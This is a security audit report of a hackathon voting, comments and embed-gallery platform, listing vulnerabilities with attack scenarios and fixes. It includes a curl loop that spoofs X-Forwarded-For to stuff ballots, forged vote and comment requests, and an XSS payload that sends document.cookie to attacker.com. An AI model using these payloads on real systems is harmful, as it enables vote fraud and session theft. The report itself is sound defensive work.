# Comprehensive Implementation & Security Audit: Hackathon Voting, Gallery & Anti-Abuse System

---

## 1. Executive Summary

An in-depth implementation and security audit of the **DOGFOOD 2026 Hackathon Judgment Platform (CATFOOD)** was conducted across the backend API, Prisma ORM schema, SQLite database layer, middleware, services, controllers, and React frontend. 

The audit focused specifically on the **T3 feature tier**:
1. **Community voting with configurable access modes**
2. **Voting mechanisms, credit manipulation, and race conditions**
3. **Gallery project comments and moderation**
4. **Vote result concealment during active voting**
5. **Randomized project ballot ordering**
6. **Anti-abuse, rate limiting, and audit logging**

### Key Audit Findings
* **Critical Integrity Flaw in Voting Model:** The platform attempts to implement **Quadratic Voting** ($\sum \sqrt{\text{credits}}$), but accepts raw `credits` directly from client request bodies (`req.body.credits`) without validation, bounds checking, or voter credit budgets. A malicious client can submit `credits: 100000000` to inject 10,000 points in a single vote, or pass negative credits (`-1`) to calculate $\sqrt{-1} = \text{NaN}$, poisoning the entire leaderboard calculation for all participants.
* **Trivial Rate-Limit & Sybil Bypass:** IP-based rate limiting relies on unvalidated `req.headers['x-forwarded-for']` headers without reverse-proxy trust validation. Attackers can cycle arbitrary IP addresses in request headers to bypass the in-memory rate limiter completely. In addition, the in-memory `Map` leaks memory over time and fails in multi-process/clustered deployments.
* **Email-Gating Without Verification:** In `EMAIL` mode, the backend merely checks `email.includes('@')`. There is zero challenge-response, OTP, confirmation token, or magic link verification. An adversary can script thousands of votes using randomized string emails.
* **Database Constraint Gaps & SQLite NULL Semantics:** In `OPEN` mode (`voterEmail: null`), the compound unique constraint `@@unique([submissionId, voterEmail])` fails because in SQL standard and SQLite, `NULL != NULL`. Unlimited duplicate votes with `voterEmail: null` can be inserted.
* **Critical Authorization & Impersonation Gaps in Comments:** Comment creation requires no authentication and accepts arbitrary `authorName` and `authorEmail` in the request body. Anyone can post comments impersonating organizers or judges. Furthermore, comments lack any edit or delete capabilities (even for organizers) and have no rate limiting.
* **Frontend-Backend Contract Disconnect:** In [`OrganizerEventDashboard.jsx`](file:///home/vansh/code/cfr/CATFOOD/frontend/src/pages/OrganizerEventDashboard.jsx#L399-L409), the UI toggle buttons send `{ isVotingActive }` and `{ areResultsRevealed }`. The backend endpoint expects `{ isCommunityVotingOpen, isCommunityResultsRevealed }`. Because property names do not match, **clicking the toggles in the organizer UI silently fails to update the database**, despite displaying a success notification. Furthermore, the UI lacks any configuration dropdown for `communityVotingMode`.
* **Stored Cross-Site Scripting (XSS):** The embed gallery endpoint ([`embedController.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/embedController.js#L29-L46)) concatenates untrusted submission titles, team names, and repository URLs directly into raw HTML strings without sanitization or HTML entity encoding.
* **Acceptance Suite Configuration Omission:** The acceptance runner [`run_t3.py`](file:///home/vansh/code/cfr/CATFOOD/run_t3.py) failed primarily because [`.dogfood.toml`](file:///home/vansh/code/cfr/CATFOOD/.dogfood.toml) omits the route mappings for `vote`, `results`, `comments`, and `audit_log`, and because fixture project identifiers (`"prj_01"`) cause `parseInt` in [`communityService.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L24) to evaluate to `NaN`.

---

## 2. Feature-by-Feature Audit Table

| Feature Area | Implementation Status | Enforced Server-Side? | Security / Integrity Posture | Primary Risk |
| :--- | :--- | :---: | :--- | :--- |
| **1. Configurable Community Voting Access** | `🔴 Vulnerable` | Partial | `OPEN`, `EMAIL`, `AUTHENTICATED` modes present in backend, but `EMAIL` has zero verification and `OPEN` allows unlimited duplicate votes. Frontend has zero UI to configure modes. | Sybil ballot stuffing; organizer unable to configure mode via UI. |
| **2. Voting Model & Quadratic Enforcement** | `🔴 Vulnerable` | ❌ No | Client directly dictates `credits` parameter; no voter budget; negative credits produce `NaN` poison; self-voting by project authors permitted. | Client-side score inflation, DoS on standings calculations. |
| **3. Project Comments** | `🔴 Vulnerable` | ❌ No | Comments persist, but lack edit/delete endpoints, lack rate limiting, and permit arbitrary user impersonation (`authorName`/`authorEmail`). | Identity spoofing, spam flooding, unmoderatable content. |
| **4. Concealed Results During Voting Window** | `⚠️ Partially implemented` | ✅ Yes | Results endpoint hides scores unless revealed or requested by event organizer, but auto-incrementing `voteId` leaks platform voting velocity; pairwise standings leak unsealed scores. | Enumeration, information leakage, co-organizers locked out. |
| **5. Randomized Project Ordering** | `⚠️ Partially implemented` | ✅ Yes | Randomization is per-request using Fisher-Yates followed by flawed `sort(() => Math.random() - 0.5)`. Embed gallery is unrandomized. | Disorienting UX on navigation; biased distribution; embed bias. |
| **6. Anti-Abuse & Audit Trail** | `🔴 Vulnerable` | ❌ No | Rate limiting is IP-spoofable; TOCTOU race conditions on duplicate votes; failed/duplicate votes never logged; multi-tenant audit log leak. | Automated bot voting, unlogged attacks, cross-tenant data leak. |

---

## 3. Architecture & Request-Flow Findings

```
                       [ Client / Voter / Attacker ]
                                     |
              +----------------------+----------------------+
              |                      |                      |
     POST /api/community/vote   POST /comments       GET /api/embed/gallery
              |                      |                      |
    [ optionalAuthenticate ]   [ optionalAuth ]             |
              |                      |                      |
  [ communityController.js ]   [ communityCtrl ]     [ embedController.js ]
              |                      |                      |
      (Spoofed Headers:              |              (Raw String HTML Concat)
      X-Forwarded-For)               |                      |
              |                      |                 [ Stored XSS ]
    [ communityService.js ]    [ communityServ ]
     - checkIpRateLimit()       - addComment()
       (In-memory Map)            (No Rate Limit,
     - Missing Credits Budget      No User FK,
     - TOCTOU Race Condition       Arbitrary Name)
              |                      |
              +----------+-----------+
                         |
                 [ Prisma Client ]
                         |
                 [ SQLite Database ]
           - CommunityVote: (submissionId, voterEmail) NULL bypass
           - Comment: No authorId FK, No edit/delete timestamps
           - Event: Disconnected UI property names
```

### Trace 1: Voting Flow (`POST /api/community/vote` or `POST /api/community/:eventId/vote`)
1. **Routing:** [`communityRoutes.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/routes/communityRoutes.js#L8-L9) mounts `POST /vote` and `POST /:eventId/vote` with `optionalAuthenticate`.
2. **Controller:** [`communityController.castVote`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/communityController.js#L4-L25) extracts:
   * `submissionId`: defaults to `req.body.submissionId || req.body.project_id`.
   * `voterEmail`: defaults to `req.body.voterEmail || req.user?.email || 'voter@example.com'`. **Bug:** An unauthenticated voter without an email defaults to `'voter@example.com'`, causing all subsequent unauthenticated voters on that project to collide and get rejected.
   * `voterIp`: reads `req.headers['x-forwarded-for'] || req.socket.remoteAddress`. **Vulnerability:** Directly trusting client-provided forward headers allows trivial rate limit spoofing.
   * `credits`: passes raw `req.body.credits` directly to the service.
3. **Service Logic:** [`communityService.castVote`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L23-L112):
   * Validates `event.isCommunityVotingOpen`.
   * Mode evaluation:
     * `AUTHENTICATED`: checks `if (!currentUser) return 401`.
     * `EMAIL`: checks `if (!email || !email.includes('@')) return 400`.
     * `OPEN`: sets `email = email || null`.
   * Rate limiting: `checkIpRateLimit(voterIp)` checks an in-memory `Map`.
   * Duplicate check: `prisma.communityVote.findFirst(...)`.
   * Credit parsing: `const parsedCredits = parseInt(credits, 10) || 1`.
   * Insertion: `prisma.communityVote.create(...)`.
   * Audit logging: `prisma.auditLog.create(...)` with `action: 'COMMUNITY_VOTE_CAST'`. Note that `actorId` is omitted (`null`), and rejected duplicate votes are **never logged**.

### Trace 2: Settings Configuration Flow (`PATCH /api/community/:eventId/settings`)
1. **Routing:** [`communityRoutes.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/routes/communityRoutes.js#L19-L24) requires `authenticate` and `requireRole('ORGANIZER')`.
2. **Controller:** [`communityController.updateVotingSettings`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/communityController.js#L91-L99) calls service.
3. **Service:** [`communityService.updateVotingSettings`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L218-L245):
   * Checks `isOrganizer = currentUser?.isGlobalAdmin || event.organizerId === currentUser?.id`. **Bug:** Ignores co-organizers mapped in [`EventMember`](file:///home/vansh/code/cfr/CATFOOD/backend/prisma/schema.prisma#L107-L120) with role `'ORGANIZER'`.
   * Updates `isCommunityVotingOpen`, `isCommunityResultsRevealed`, and `communityVotingMode`.
   * **Contract Disconnect:** The frontend UI ([`OrganizerEventDashboard.jsx`](file:///home/vansh/code/cfr/CATFOOD/frontend/src/pages/OrganizerEventDashboard.jsx#L401-L403)) sends `{ isVotingActive, areResultsRevealed }`. The backend checks `isCommunityVotingOpen !== undefined` and `isCommunityResultsRevealed !== undefined`. Consequently, the update query receives `undefined` for both fields, preserving existing values while the UI claims success.

### Trace 3: Comments Flow (`POST /api/community/comments/:submissionId`)
1. **Routing:** [`communityRoutes.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/routes/communityRoutes.js#L13-L16) mounts `POST /comments/:submissionId` and `POST /comments_proxy` with `optionalAuthenticate`.
2. **Controller:** [`communityController.addComment`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/communityController.js#L37-L54) extracts `authorName`, `authorEmail`, and `content`.
3. **Service:** [`communityService.addComment`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L175-L207):
   * Validates length between 2 and 2000 characters.
   * If unauthenticated, directly trusts `authorName` and `authorEmail` from request body.
   * Creates `Comment` record. No authorization check, no user relation, no HTML sanitization, and no audit trail.

---

## 4. Security Vulnerabilities

### VULN-01: Arbitrary Client-Controlled Vote Weighting & Quadratic Formula Poisoning (Critical)
* **Status:** `🔴 Vulnerable`
* **Evidence:**
  * Files: [`communityController.js: line 10`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/communityController.js#L10), [`communityService.js: lines 82, 149`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L82), [`schema.prisma: line 331`](file:///home/vansh/code/cfr/CATFOOD/backend/prisma/schema.prisma#L331)
  * Endpoints: `POST /api/community/vote`, `POST /api/community/:eventId/vote`
* **Vulnerability Mechanics:**
  The platform intends to compute standings via Quadratic Voting ($\text{score} = \sum \sqrt{\text{credits}}$). However, the number of credits is directly supplied by the client without an allocation budget:
  ```javascript
  // communityService.js line 82
  const parsedCredits = parseInt(credits, 10) || 1;
  ```
  In [`communityService.js: line 149`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L149), results are calculated via:
  ```javascript
  for (const v of s.communityVotes) {
    calculatedScore += Math.sqrt(v.credits);
  }
  ```
* **Attack Scenario:**
  1. An attacker sends a single HTTP request:
     ```http
     POST /api/community/1/vote HTTP/1.1
     Content-Type: application/json

     {
       "submissionId": 42,
       "credits": 25000000
     }
     ```
     The project receives $\sqrt{25000000} = 5,000$ points from a single vote, immediately hijacking first place.
  2. Alternatively, a malicious actor submits `{"submissionId": 42, "credits": -1}`. `parseInt("-1", 10)` yields `-1`. In [`getCommunityResults`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L149), `Math.sqrt(-1)` produces `NaN`. Every aggregate sum and leaderboard sorting comparison evaluates to `NaN`, permanently crashing the community leaderboard for all users.
* **Severity:** **Critical**
* **Fix Required:**
  Remove client-supplied arbitrary `credits`. Enforce either:
  * Strict 1-person-1-vote (`credits = 1` constant on the server).
  * True quadratic voting where each authenticated voter is initialized with a fixed credit budget (e.g., 100 credits) across the entire event, verified and atomically decremented within a database transaction. Reject any non-positive or non-integer credit input.

---

### VULN-02: IP Rate-Limiting Bypass via Spoofed `X-Forwarded-For` Headers (High)
* **Status:** `🔴 Vulnerable`
* **Evidence:**
  * Files: [`communityController.js: line 9`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/communityController.js#L9), [`communityService.js: lines 5-21`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L5-L21), [`server.js: line 14`](file:///home/vansh/code/cfr/CATFOOD/backend/src/server.js#L14)
  * Endpoints: `POST /api/community/vote`, `POST /api/community/:eventId/vote`
* **Vulnerability Mechanics:**
  In [`communityController.js: line 9`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/communityController.js#L9):
  ```javascript
  const voterIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  ```
  The Express application does not configure `app.set('trust proxy', ...)`, yet directly accepts the raw `x-forwarded-for` HTTP header supplied by the client. Any external user can inject arbitrary IP addresses.
* **Attack Scenario:**
  A script iterates through simulated IP addresses in a loop:
  ```bash
  for i in $(seq 1 1000); do
    curl -X POST http://localhost:8080/api/community/1/vote \
      -H "Content-Type: application/json" \
      -H "X-Forwarded-For: 203.0.113.$i" \
      -d "{\"submissionId\": 1, \"voterEmail\": \"sybil$i@domain.com\"}"
  done
  ```
  Every request registers a new IP address, completely evading `checkIpRateLimit()` and dumping 1,000 illegitimate votes into the database.
* **Severity:** **High**
* **Fix Required:**
  * Configure Express with trusted reverse proxy subnet definitions (`app.set('trust proxy', 'loopback')`).
  * Obtain client IP exclusively through Express's sanitized `req.ip`.
  * Replace the in-memory `ipVoteHistory` Map with Redis or a persistent database-backed token bucket to handle multi-instance environments and prevent memory leaks.

---

### VULN-03: Complete Email-Gated Voting Bypass (High)
* **Status:** `🔴 Vulnerable`
* **Evidence:**
  * Files: [`communityService.js: lines 53-58`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L53-L58)
  * Endpoints: `POST /api/community/vote`, `POST /api/community/:eventId/vote`
* **Vulnerability Mechanics:**
  When `communityVotingMode === 'EMAIL'`, the server executes:
  ```javascript
  if (!email || !email.includes('@')) {
    const error = new Error('Valid email address is required to cast a community vote.');
    error.statusCode = 400;
    throw error;
  }
  ```
  The server performs no cryptographic verification, sends no confirmation email, requires no one-time passcode (OTP), and issues no validation link. Any string with `@` (e.g., `attacker1@bot.net`, `attacker2@bot.net`) is accepted.
* **Attack Scenario:**
  An adversary creates a simple generator:
  `fake-vote-1@anything.com`, `fake-vote-2@anything.com`, etc.
  Because the database uniqueness constraint only enforces `@@unique([submissionId, voterEmail])`, every newly generated email string bypasses duplicate detection. An attacker can cast thousands of automated votes in minutes.
* **Severity:** **High**
* **Fix Required:**
  Implement a two-step email verification protocol:
  1. Voter submits email $\rightarrow$ system generates an HMAC-signed, time-limited magic token and emails it to the user.
  2. Voter submits the signed token to cast the vote.
  Alternatively, restrict community voting to `AUTHENTICATED` mode using verified platform accounts.

---

### VULN-04: Open Voting Mode Duplicate-Vote Protection Failure via SQLite NULL Semantics (High)
* **Status:** `🔴 Vulnerable`
* **Evidence:**
  * Files: [`schema.prisma: line 334`](file:///home/vansh/code/cfr/CATFOOD/backend/prisma/schema.prisma#L334), [`communityService.js: lines 60, 70-74, 88`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L60)
  * Endpoints: `POST /api/community/vote`
* **Vulnerability Mechanics:**
  In [`schema.prisma`](file:///home/vansh/code/cfr/CATFOOD/backend/prisma/schema.prisma#L334):
  ```prisma
  @@unique([submissionId, voterEmail])
  ```
  In SQL and SQLite, `NULL` values are distinct from all other `NULL` values. If `communityVotingMode === 'OPEN'` and `email` is `null`:
  * Multiple rows with `submissionId: 1` and `voterEmail: null` do not violate the compound unique index.
  * In [`communityService.js: lines 70-74`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L70-L74), duplicate detection checks `prisma.communityVote.findFirst({ where: { submissionId, voterIp, voterEmail: null } })`.
  * Because there is no database-level unique constraint on `(submissionId, voterIp)`, concurrent requests bypass `findFirst` and insert multiple duplicate votes under the same IP.
* **Attack Scenario:**
  Using concurrent requests or spoofed IPs, an attacker repeatedly posts votes in `OPEN` mode. The database happily creates multiple votes for the same submission because `voterEmail` is NULL.
* **Severity:** **High**
* **Fix Required:**
  * In `OPEN` mode, generate a unique voter session cookie or fingerprint hash stored in a required `voterFingerprint` column.
  * Add a database uniqueness constraint: `@@unique([submissionId, voterFingerprint])` or enforce non-null identifier values across all modes.

---

### VULN-05: TOCTOU Concurrency Race Condition in Vote Creation (Medium)
* **Status:** `🔴 Vulnerable`
* **Evidence:**
  * Files: [`communityService.js: lines 65-92`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L65-L92)
  * Endpoints: `POST /api/community/vote`
* **Vulnerability Mechanics:**
  The service uses an un-isolated check-then-act sequence:
  ```javascript
  existingVote = await prisma.communityVote.findFirst({ where: ... });
  if (existingVote) throw 409;
  await prisma.communityVote.create({ data: ... });
  ```
  There is no `prisma.$transaction`, no row-level locking, and no serialized database transaction.
* **Attack Scenario:**
  An attacker sends 10 identical voting requests simultaneously via `Promise.all` or `curl --parallel`. Both requests complete the `findFirst` check before either completes `prisma.communityVote.create`. In `OPEN` mode (where database constraints do not catch NULLs), both votes are permanently committed.
* **Severity:** **Medium**
* **Fix Required:**
  Execute vote verification and insertion inside a serialized database transaction (`prisma.$transaction(async (tx) => { ... })`), or rely on an atomic DB-level upsert/unique constraint and handle `P2002` (unique constraint violation) by returning a 409 Conflict.

---

### VULN-06: Unauthenticated Comment Author Impersonation (Medium)
* **Status:** `🔴 Vulnerable`
* **Evidence:**
  * Files: [`communityRoutes.js: lines 13-16`](file:///home/vansh/code/cfr/CATFOOD/backend/src/routes/communityRoutes.js#L13-L16), [`communityController.js: line 40`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/communityController.js#L40), [`communityService.js: lines 194-204`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L194-L204)
  * Endpoints: `POST /api/community/comments/:submissionId`, `POST /api/community/comments_proxy`
* **Vulnerability Mechanics:**
  `POST /api/community/comments/:submissionId` uses `optionalAuthenticate`. If the user is unauthenticated:
  ```javascript
  const name = (currentUser?.name || authorName || 'Anonymous Community Member').trim();
  const email = (currentUser?.email || authorEmail || 'community@example.org').trim().toLowerCase();
  ```
  The endpoint accepts arbitrary `authorName` and `authorEmail` values directly from the unauthenticated request body.
* **Attack Scenario:**
  An attacker sends:
  ```http
  POST /api/community/comments/1 HTTP/1.1
  Content-Type: application/json

  {
    "authorName": "Sarah Connor (Organizer)",
    "authorEmail": "organizer@hack.com",
    "content": "Official Announcement: This project has been disqualified due to plagiarism."
  }
  ```
  The comment appears in the project gallery as an official post from the event organizer.
* **Severity:** **Medium**
* **Fix Required:**
  * Require authentication (`authenticate` middleware) to post comments.
  * Populate `authorName` and `authorEmail` strictly from `req.user.name` and `req.user.email`.
  * Add an `authorId` foreign key linking `Comment` to the `User` model.

---

### VULN-07: Missing Comment Moderation & Immutability Lock-In (Medium)
* **Status:** `❌ Missing`
* **Evidence:**
  * Files: [`communityRoutes.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/routes/communityRoutes.js#L12-L17), [`communityService.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L175-L216)
  * Endpoints: None exists
* **Vulnerability Mechanics:**
  There are no `DELETE /api/community/comments/:commentId` or `PUT /api/community/comments/:commentId` endpoints. Once created, a comment cannot be edited or deleted by the author, project owner, or hackathon organizer.
* **Attack Scenario:**
  An attacker posts defamatory content, profanity, harassment, or confidential keys in a comment. The organizer has no administrative endpoint or UI mechanism to delete or hide the comment without performing direct SQL manipulation on the production database.
* **Severity:** **Medium**
* **Fix Required:**
  Implement `DELETE /api/community/comments/:commentId` protected by role checks (allowing comment authors, the submission's team leader, and event organizers to delete). Add an `isDeleted` or `status` moderation column to `Comment`.

---

### VULN-08: Stored Cross-Site Scripting (XSS) in Embed Gallery (Medium)
* **Status:** `🔴 Vulnerable`
* **Evidence:**
  * Files: [`embedController.js: lines 29-45`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/embedController.js#L29-L45)
  * Endpoint: `GET /api/embed/gallery`, `GET /api/embed/gallery/:eventId`
* **Vulnerability Mechanics:**
  In [`embedController.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/embedController.js#L29-L45):
  ```javascript
  const cardsHtml = submissions.map((s) => `
    <div class="df-card">
      <div class="df-card-track">${s.track?.name || 'General Track'}</div>
      <h3 class="df-card-title">${s.title}</h3>
      <p class="df-card-team">by ${s.team?.name || 'Hackathon Team'}</p>
      <p class="df-card-tagline">${s.tagline || ''}</p>
      ${s.repoUrl ? `<a href="${s.repoUrl}" target="_blank" class="df-card-link">View Repository &rarr;</a>` : ''}
    </div>
  `).join('');
  ```
  `s.title`, `s.team.name`, `s.tagline`, and `s.repoUrl` are directly interpolated into the HTML string without escaping HTML special characters (`<`, `>`, `"`, `'`, `&`).
* **Attack Scenario:**
  A participant registers a project title:
  `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`
  or a repo URL:
  `javascript:alert(document.domain)`
  Whenever an organizer, judge, or visitor views the embed gallery page, the payload executes in the viewer's browser session.
* **Severity:** **Medium**
* **Fix Required:**
  Apply strict HTML entity encoding (`escapeHtml(s.title)`) to all user-controlled database fields before template interpolation, and validate that `repoUrl` uses only `http:` or `https:` protocols.

---

### VULN-09: Platform-Wide Vote Velocity & Count Enumeration via Auto-Incrementing IDs (Low)
* **Status:** `🔴 Vulnerable`
* **Evidence:**
  * Files: [`communityService.js: line 107`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L107), [`schema.prisma: line 324`](file:///home/vansh/code/cfr/CATFOOD/backend/prisma/schema.prisma#L324)
  * Endpoint: `POST /api/community/vote`
* **Vulnerability Mechanics:**
  `POST /api/community/vote` returns `{ voteId: vote.id }`. Because `CommunityVote.id` is an auto-incrementing integer (`@id @default(autoincrement())`), sequential requests reveal the exact number of votes cast across the platform during that interval.
* **Attack Scenario:**
  An attacker votes at 14:00 and receives `voteId: 100`. At 14:05 they vote again and receive `voteId: 185`. The attacker infers that exactly 85 votes were cast across all hackathons during that 5-minute window, effectively breaking confidentiality surrounding voting velocity and activity volume during the sealed window.
* **Severity:** **Low**
* **Fix Required:**
  Do not return `voteId` to unauthenticated voters, or use random UUIDv4 / CUID identifiers for `CommunityVote`.

---

### VULN-10: Multi-Tenant Audit Log Leakage (Medium)
* **Status:** `🔴 Vulnerable`
* **Evidence:**
  * Files: [`eventRoutes.js: lines 196-203`](file:///home/vansh/code/cfr/CATFOOD/backend/src/routes/eventRoutes.js#L196-L203), [`judgingController.js: lines 198-206`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/judgingController.js#L198-L206), [`auditService.js: lines 43-58`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/auditService.js#L43-L58)
  * Endpoint: `GET /api/events/:id/audit-logs`
* **Vulnerability Mechanics:**
  [`judgingController.getAuditLogs`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/judgingController.js#L198-L206) handles `GET /api/events/:id/audit-logs`. The controller passes `req.query` directly to `auditService.getAuditLogs`, completely ignoring `req.params.id` / `req.params.eventId`. Furthermore, `AuditLog` does not even possess an `eventId` foreign key in [`schema.prisma`](file:///home/vansh/code/cfr/CATFOOD/backend/prisma/schema.prisma#L307-L321).
* **Attack Scenario:**
  An organizer of Event A calls `GET /api/events/1/audit-logs`. They receive all audit records platform-wide, including actions, target IDs, judge invitations, and scoring timestamps from competing Event B and Event C.
* **Severity:** **Medium**
* **Fix Required:**
  Add `eventId Int?` to the `AuditLog` model, filter queries strictly by `where: { eventId: parseInt(req.params.id, 10) }`, and verify the requesting user owns that specific event.

---

### VULN-11: Unsealed Pairwise & Leaderboard Standings Exposure (Medium)
* **Status:** `🔴 Vulnerable`
* **Evidence:**
  * Files: [`judgingService.js: lines 978, 1130-1180`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/judgingService.js#L978), [`judgingRoutes.js: lines 87-97`](file:///home/vansh/code/cfr/CATFOOD/backend/src/routes/judgingRoutes.js#L87-L97)
  * Endpoints: `GET /api/judging/pairwise/standings`, `GET /api/judging/:eventId/pairwise/standings`
* **Vulnerability Mechanics:**
  1. [`judgingService.getPairwiseStandings`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/judgingService.js#L1130-L1180) contains **zero authorization checks**. Any authenticated user (including participants) can call `GET /api/judging/pairwise/standings` at any time and receive real-time Bradley-Terry rankings, log-likelihood, and win-loss tallies while judging/voting is in progress.
  2. In [`judgingService.getLeaderboard`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/judgingService.js#L978):
     ```javascript
     if (!event.isLeaderboardPublished && !isOrganizer && !isJudge) {
       throw 403;
     }
     ```
     Any user assigned as a judge can view the unpublished leaderboard before the organizer finalizes or publishes it.
* **Severity:** **Medium**
* **Fix Required:**
  Enforce `isLeaderboardPublished` on pairwise standings, and restrict pre-publication access exclusively to event organizers and global admins.

---

## 5. Abuse Scenarios

### Scenario A: Scripted Ballot Stuffing via Header Rotation
```
Attacker Script 
  │
  ├─> Request 1: POST /api/community/vote { submissionId: 5, voterEmail: "a1@x.com" }
  │   Header: "X-Forwarded-For: 10.0.0.1" ──> Rate Limit: 1/30 (Allowed)
  │
  ├─> Request 2: POST /api/community/vote { submissionId: 5, voterEmail: "a2@x.com" }
  │   Header: "X-Forwarded-For: 10.0.0.2" ──> Rate Limit: 1/30 (Allowed)
  │
  └─> Request N: POST /api/community/vote { submissionId: 5, voterEmail: "aN@x.com" }
      Header: "X-Forwarded-For: 10.0.0.N" ──> Rate Limit: 1/30 (Allowed)
```
* **Impact:** 10,000 automated votes cast in under 2 minutes for project #5.
* **Why it succeeds:** Server trusts client-controlled `X-Forwarded-For` header; `EMAIL` mode requires no validation; database unique constraint checks email string only.

---

### Scenario B: Leaderboard Denial of Service via Quadratic Poisoning
```
Attacker Request:
POST /api/community/vote
{
  "submissionId": 1,
  "credits": -99
}

Server execution:
v.credits = -99
Math.sqrt(-99) => NaN
totalVotes = sum + NaN => NaN
standings.sort(NaN comparison) => Corrupted Order
API response to Organizer: { totalVotes: NaN, standings: [...] }
```
* **Impact:** Results endpoint breaks permanently until direct database remediation deletes the corrupt vote row.
* **Why it succeeds:** Zero validation on the `credits` field in [`castVote`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L82).

---

### Scenario C: Uncontested Self-Voting by Participants
* A participant registers Team Alpha with submission ID 10.
* During active voting, the participant casts a vote for submission ID 10.
* **Why it succeeds:** [`castVote`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L23-L112) checks if the event is open, but does not inspect `submission.team.members` or `submission.team.leaderId` against `currentUser.id`. Every participant can vote for their own project.

---

## 6. Missing Database Constraints

The Prisma schema ([`schema.prisma`](file:///home/vansh/code/cfr/CATFOOD/backend/prisma/schema.prisma)) exhibits several missing constraints and relational gaps:

| Model | Missing Constraint / Field | Impact | Recommended Prisma Schema Change |
| :--- | :--- | :--- | :--- |
| `CommunityVote` | `@@unique([submissionId, voterIp])` | In `OPEN` mode (`voterEmail: null`), duplicate IP votes can be inserted repeatedly because SQLite `NULL != NULL`. | Add composite constraint for IP in open mode, or require unique session token. |
| `CommunityVote` | `@@unique([eventId, voterEmail])` | If the hackathon rule is 1 ballot per voter per event, the current schema allows voting once **per project** across all projects. | Add `@@unique([eventId, voterEmail])` if ballot-wide single voting is intended. |
| `CommunityVote` | Positive check constraint on `credits` | Client can insert negative or absurd numbers (`credits: -100`, `credits: 100000000`). | Add application validator `credits > 0 && credits <= MAX_CREDITS` and database check constraint. |
| `Comment` | Missing `authorId` relation to `User` | Comments store unverified string names/emails. If a user is deleted or renamed, comments have orphaned data; unauthenticated users can impersonate anyone. | `authorId Int?`, `author User? @relation(fields: [authorId], references: [id], onDelete: SetNull)` |
| `Comment` | Missing `isModerated` / `isDeleted` | No way to soft-delete or flag offensive comments. | Add `isDeleted Boolean @default(false)` |
| `AuditLog` | Missing `eventId` foreign key | Audit logs cannot be queried by event. Calling `GET /api/events/:id/audit-logs` leaks platform-wide logs. | `eventId Int?`, `event Event? @relation(fields: [eventId], references: [id], onDelete: Cascade)` |
| `Event` | Validation on `communityVotingMode` | String accepts any arbitrary text (`"INVALID_MODE"`). | Restrict using Prisma enum or validation whitelist: `enum VotingMode { OPEN EMAIL AUTHENTICATED }` |

---

## 7. Missing Tests & Acceptance Suite Discrepancies

### Acceptance Test Findings ([`run_t3.py`](file:///home/vansh/code/cfr/CATFOOD/run_t3.py) vs [`.dogfood.toml`](file:///home/vansh/code/cfr/CATFOOD/.dogfood.toml))
When running `python3 run_t3.py .dogfood.toml`, the test run produced:
```
T3  vote can be cast ......................................... FAIL (got 404)
T3  duplicate vote rejected .................................. PASS
T3  results hidden from non-organizers during voting window .. FAIL (got 404)
T3  organizer can see results ................................ FAIL (got 404)
T3  comment can be posted and read back ...................... FAIL (got 404)
T3  ballot ordering is randomised ............................ PASS
T3  anti-abuse: duplicate vote leaves an audit trail ......... FAIL (got 404)
```

#### Why `run_t3.py` Failed:
1. **Missing Routes in [`.dogfood.toml`](file:///home/vansh/code/cfr/CATFOOD/.dogfood.toml):**
   [`.dogfood.toml`](file:///home/vansh/code/cfr/CATFOOD/.dogfood.toml#L16-L22) only declared:
   ```toml
   [routes]
   gallery = "/projects"
   submit = "/projects/new"
   judge_scores = "/api/judge/scores"
   peer_scores = "/api/judge/scores?judge=judge_a"
   csv_export = "/api/organizer/judging/export.csv"
   ```
   It completely omitted:
   * `vote = "/api/community/vote"`
   * `results = "/api/community/1/results"`
   * `comments = "/api/community/comments_proxy"`
   * `audit_log = "/api/events/1/audit-logs"`
   Without these entries, `url("vote")` defaulted to `http://localhost:8080/`, returning 404.
2. **Fixture ID Incompatibility (`prj_01` vs numeric ID):**
